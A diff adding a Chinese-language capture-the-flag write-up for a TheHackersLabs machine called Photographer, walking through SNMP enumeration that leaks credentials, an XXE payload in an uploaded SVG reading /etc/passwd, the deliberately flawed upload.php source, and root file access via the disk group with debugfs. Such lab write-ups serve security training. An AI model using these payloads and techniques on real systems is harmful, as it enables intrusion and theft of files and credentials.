@@ -17,7 +17,7 @@ image: /assets/img/backgrounds/thehackerslabs.png
 > **提示:** 靶机跳转传送门
 [Tortuga](https://labs.thehackerslabs.com/machines/131)
 
-<img src="/assets/img/thehackerslabs-notes/20251012150814_008.webp" alt="image-20251012143004040" style="zoom:50%;" />
+<img src="/assets/img/thehackerslabs-notes/20251012150814_008.webp" alt="Tortugs" style="zoom:50%;" />
 
 ## 信息搜集
 
@@ -81,6 +81,10 @@ c???????????????????????????ae
 ```
 
 # ZAPP
+> **提示:** 靶机跳转传送门
+[ZAPP](https://labs.thehackerslabs.com/machines/143)
+
+<img src="/assets/img/thehackerslabs-notes/zapp.png" alt="ZAPP" style="zoom:50%;" />
 
 ## 信息搜集
 
@@ -349,6 +353,271 @@ sudo: unable to resolve host TheHackersLabs-ZAPP: Name or service not known
 TheHackersLabs-ZAPP# cat ~/root.txt
 c2llbXByZSBlcyBudWV???????==
 TheHackersLabs-ZAPP#
+```
+
+# Photographer
+
+## 信息搜集
+
+IP 10.161.208.161
+
+```bash
+(base) yolo@yolo:~$ nmap -sV -Pn 10.161.208.161
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-05 21:03 CST
+Nmap scan report for 10.161.208.161
+Host is up (0.0053s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.65 ((Debian))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.58 seconds
+```
+
+就两个端口，直接看web
+
+dirsearch扫描过，发现了admin登录界面，但是账号密码都不清楚，尝试过sql注入，也失效，不喜欢爆破密码，再说同时爆破两处几乎不怎么会成功，接下来去研究有没有其他端口开放，比如说udp和tcp端口
+
+```bash
+(base) yolo@yolo:~$ sudo nmap -sU -p 53,67,68,69,123,135,137,138,139,161,162,445,514,631,1434 10.161.208.161
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-05 21:42 CST
+Nmap scan report for 10.161.208.161
+Host is up (0.0026s latency).
+
+PORT     STATE         SERVICE
+53/udp   closed        domain
+67/udp   closed        dhcps
+68/udp   open|filtered dhcpc
+69/udp   closed        tftp
+123/udp  closed        ntp
+135/udp  open|filtered msrpc
+137/udp  open|filtered netbios-ns
+138/udp  closed        netbios-dgm
+139/udp  closed        netbios-ssn
+161/udp  open          snmp
+162/udp  closed        snmptrap
+445/udp  closed        microsoft-ds
+514/udp  closed        syslog
+631/udp  open|filtered ipp
+1434/udp open|filtered ms-sql-m
+
+Nmap done: 1 IP address (1 host up) scanned in 6.95 seconds
+```
+
+发现这里的snmp端口开放，相关介绍可以拜读下面的宝藏笔记
+
+宝藏网站笔记https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-snmp/index.html
+
+```bash
+(base) yolo@yolo:~$ snmpwalk -v 2c -c public 10.161.208.161 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+NET-SNMP-EXTEND-MIB::nsExtendOutputFull = No more variables left in this MIB View (It is past the end of the MIB tree)
+(base) yolo@yolo:~$ snmpwalk -v 2c -c security 10.161.208.161 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+NET-SNMP-EXTEND-MIB::nsExtendOutputFull."mycreds" = STRING: ethan:1N3qVgwNB6cZmNSyr8iX$!
+```
+
+会发现这里，SNMP的只读社区字符串读取不到信息，只能在特权社区中去读取，应该是拿到了网站的账密，理由是ethan刚好在主页见过
+
+<img src="2025-10-18-the-hackers-labs.assets/image-20251105215034702.png" alt="image-20251105215034702" style="zoom:50%;" />
+
+## get shell
+
+成功登录进来了
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,100;0,300;0,400;0,700;0,900;1,100;1,300;1,400;1,700;1,900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css?v=1">
+    <title>Admin</title>
+</head>
+<body>
+	<div class="log-form">
+		<h2>Subir Fotografía</h2>
+	  	<form method="POST" action="upload.php" enctype="multipart/form-data">
+			<input type="file" name="file" accept=".jpg,.png,.gif,.jpeg">
+	    		<button type="submit" class="btn">Subir</button>
+	  	</form>
+	</div>
+
+	<a href="/admin/logout.php" style="background: #b00020; color: #fff; text-decoration: none; padding: .5rem; margin-top: 1rem; display: inline-block;" >Cerrar sesión</a>
+	<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+</body>
+</html>
+
+```
+
+发现是个文件上传，而且呢，~~这里只有前端限制，完全可以抓包再发~~
+
+图片上传失败了，因为我发现上传的图片会自动打开，然后观察到这里用img标签解析，那么也许可以尝试下svg
+
+<img src="2025-10-18-the-hackers-labs.assets/image-20251105221154546.png" alt="image-20251105221154546" style="zoom:50%;" />
+
+look here
+
+<img src="2025-10-18-the-hackers-labs.assets/image-20251105221030326.png" alt="image-20251105221030326" style="zoom:50%;" />
+
+然后我研究了下，尝试的payload如下，可以读任意文件
+
+```html
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >
+]>
+<svg width="400" height="200" xmlns="http://www.w3.org/2000/svg">
+  <text x="20" y="20">&xxe;</text>
+</svg>
+
+```
+
+先拿下upload.php，很疑惑，为啥能传svg文件
+
+<img src="2025-10-18-the-hackers-labs.assets/image-20251105222247800.png" alt="image-20251105222247800" style="zoom:50%;" />
+
+```php
+<?php
+
+function displayHTMLImage($imageFile)
+{
+    $type = mime_content_type($imageFile);
+
+    switch ($type) {
+        case 'image/jpg':
+            echo "<img style=\"object-fit: contain; \" width='400' height='200' src='data:image/jpg;base64," . base64_encode(file_get_contents($imageFile)) . "'/>";
+            break;
+        case 'image/jpeg':
+            echo "<img style=\"object-fit: contain; \" width='400' height='200' src='data:image/jpeg;base64," . base64_encode(file_get_contents($imageFile)) . "'/>";
+            break;
+        case 'image/png':
+            echo "<img style=\"object-fit: contain; \" width='400' height='200' src='data:image/png;base64," . base64_encode(file_get_contents($imageFile)) . "'/>";
+            break;
+        case 'image/gif':
+            echo "<img style=\"object-fit: contain; \" width='400' height='200' src='data:image/gif;base64," . base64_encode(file_get_contents($imageFile)) . "'/>";
+            break;
+        case 'image/svg+xml'://关注这里，启用外部实体加载，会直接输出svg内容
+            libxml_disable_entity_loader(false);
+	    $doc = new DOMDocument();
+            $doc->loadXML(file_get_contents($imageFile), LIBXML_NOENT | LIBXML_DTDLOAD);
+	    $svg = $doc->getElementsByTagName('svg');
+            echo $svg->item(0)->C14N();
+            break;
+        default:
+            echo "Tipo de imagen no reconocida.";
+    }
+}
+
+$target_dir = "./ethan_photographs/";
+
+$fileName = date('ymd') . '_' . basename($_FILES["file"]["name"]);
+$target_file = $target_dir . $fileName;
+
+
+$contentType = $_FILES['file']['type'];
+$MIMEtype = mime_content_type($_FILES['file']['tmp_name']);
+
+
+if (preg_match('/.+\.ph(p|ps|tml)/', $fileName)) {
+    echo "ExtensiÃ³n no permitida.";
+    die();
+}
+
+if (!preg_match('/^.+\.[a-z]{2,3}g$/', $fileName)) {
+    echo "Solo se permiten imagenes.";
+    die();
+}
+//look here，发现后缀名仅仅看最后一个字母，恰好svg也是g结尾
+foreach (array($contentType, $MIMEtype) as $type) {
+    if (!preg_match('/image\/[a-z]{2,3}g/', $type)) {
+        echo "Solo se permiten imagenes.";
+        die();
+    }
+}
+
+if ($_FILES["uploadFile"]["size"] > 500000) {
+    echo "Archivo demasiado grande.";
+    die();
+}
+
+if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
+    displayHTMLImage($target_file);
+} else {
+    echo "Ocurrio un error al subir el archivo.";
+}
+```
+
+接下来关注下db.php，看有没有信息泄露
+
+```php
+<?php
+$host = "localhost";
+$db = "blog";
+$user = "root";
+$pass = "pjtF0533OPiSMQTGZacZY6jy$";
+
+$conn = new mysqli($host, $user, $pass, $db);
+if ($conn->connect_error) {
+    die("Conexión fallida: " . $conn->connect_error);
+}
+
+```
+
+拿到一个密码，应该就是服务器内部某个用户密码吧，看过/etc/passwd了，存在一个ethan
+
+```bash
+(base) yolo@yolo:~$ ssh ethan@10.161.208.161
+The authenticity of host '10.161.208.161 (10.161.208.161)' can't be established.
+ED25519 key fingerprint is SHA256:09ZSLxiw1tvVbTWbg6eZzfN1d3i5dWrpGIe+aCobTK4.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.161.208.161' (ED25519) to the list of known hosts.
+ethan@10.161.208.161's password:
+Linux photographer 6.1.0-40-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠶⣞⡩⠽⢷⣆⣀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢀⣀⡤⢿⠀⢹⠖⠒⡛⠧⠐⠉⣧⠀⠀⠀⠀
+⠀⢀⡠⠴⣲⣭⡁⠲⠇⢈⡑⢚⠪⠭⠤⠤⢄⣀⣿⠀⠀⠀⠀
+⢠⠃⠤⠄⠉⠉⠀⠐⠉⣡⠞⠁⢀⡴⠞⠉⢉⣩⠿⠶⣄⠀
+⢸⠀⠀⠀⠀⡄⠀⠀⣰⠃⠀⢠⡞⠀⠀⡴⢋⣴⣿⣿⣷⡘⣆
+⢸⠀⠀⠀⠀⡇⠀⠀⡏⠀⠀⣾⠀⠀⡜⢀⣾⣿⣤⣾⣿⡇⣿
+⢨⠀⠀⠀⠀⡇⠀⠀⣇⠀⠀⡏⠀⠀⡇⢸⣿⣿⣿⣿⣿⢁⡏
+⠈⠀⣀⠀⠀⣷⠀⠀⠘⢄⠀⢳⠀⠀⡇⠸⣿⣿⣹⡿⢃⡼⠁
+⢰⡀⠛⠓⠀⢻⠀⠀⠀⠀⢙⣻⡷⠦⣼⣦⣈⣉⣡⡴⠚⠀⠀
+⠀⢷⣄⡀⠀⠀⠀⢀⡠⠖⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠉⠛⠓⠒⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Photographer
+
+Last login: Tue Oct 28 19:47:04 2025 from 192.168.1.17
+ethan@photographer:~$ ls
+creds.txt  user.txt
+```
+
+这里的提权是通过disk用户组
+
+```bash
+ethan@photographer:~$ id
+uid=1001(ethan) gid=1001(ethan) grupos=1001(ethan),6(disk)
+```
+
+网上找了个[教程](https://blog.csdn.net/2301_79518550/article/details/145452956)，使用/usr/sbin/debugfs成功读取root.txt
+
+```bash
+ethan@photographer:~$ ls -la /dev/sd*
+brw-rw---- 1 root disk 8, 0 nov  5 14:00 /dev/sda
+brw-rw---- 1 root disk 8, 1 nov  5 14:00 /dev/sda1
+brw-rw---- 1 root disk 8, 2 nov  5 14:00 /dev/sda2
+brw-rw---- 1 root disk 8, 5 nov  5 14:00 /dev/sda5
+ethan@photographer:~$ /usr/sbin/debugfs /dev/sda1
+debugfs 1.47.0 (5-Feb-2023)
+debugfs:  ls
+debugfs:  cd /root
+debugfs:  ls
+debugfs:  cat root.txt
+dc54639c5bd88637cc23dd7???????bf
+debugfs:
 ```
 
 
